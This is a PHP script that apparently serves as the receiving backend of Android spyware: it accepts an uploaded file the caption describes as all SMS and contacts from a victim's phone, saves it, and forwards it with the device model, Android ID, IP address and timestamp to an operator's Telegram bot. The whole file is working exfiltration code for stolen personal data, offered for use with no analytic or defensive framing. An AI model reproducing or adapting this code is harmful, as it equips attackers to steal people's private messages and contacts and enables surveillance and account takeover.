<?php 
include("info.php");
include("jdf.php");
$time = jdate("H:i:s-a");
if(isset($_GET['result'])){


 $result=$_GET['result'];
  
 if($result == "ok"){
 $action=$_GET['action'];
 if(isset($_GET['androidid'])){
 $androidid=  $_GET['androidid'];
 }if(isset($_GET['model'])){
 $model=$_GET['model']; 
 }if(isset($_GET['opr'])){
 $opr = $_GET['opr'];
 }

if($action =="upload"){





$PostData = file_get_contents("php://input");



$File = fopen("upload.txt","w");



fwrite($File, $PostData); 



fclose($File);



$curl = curl_init();

curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://api.telegram.org/bot'.$token.'/sendDocument?chat_id='.$id,
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 0,
  CURLOPT_FOLLOWLOCATION => true,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => array('document'=> new CURLFILE('upload.txt'),"caption"=>"{🧺} ғɪʟᴇ ᴀʟʟ sᴍs / ᴄᴏɴᴛᴀᴄᴛ

🧬⤳sᴇɴᴅ ғɪʟᴇ ᴀᴅᴍɪɴ : True
----------------------------------------
🪛⤳ᴍᴏᴅᴇʟ : $model
🌐⤳ɪᴘ : $ip

📱⤳ᴀɴᴅʀᴏɪᴅ ɪᴅ : <code>$androidid</code>

🩸⤳ᴍᴏʙɪʟᴇ ɪɴғᴏʀᴍᴀᴛɪᴏɴ {☝️🏻}
----------------------------------------
⏰⤳ᴛɪᴍᴇ : $time
🧨⤳ᴘᴏʀᴛ : $prt

🧑🏻‍💻 ᴏᴡɴᴇʀ $crd

")
));

$response = curl_exec($curl);

curl_close($curl);



}}}


?>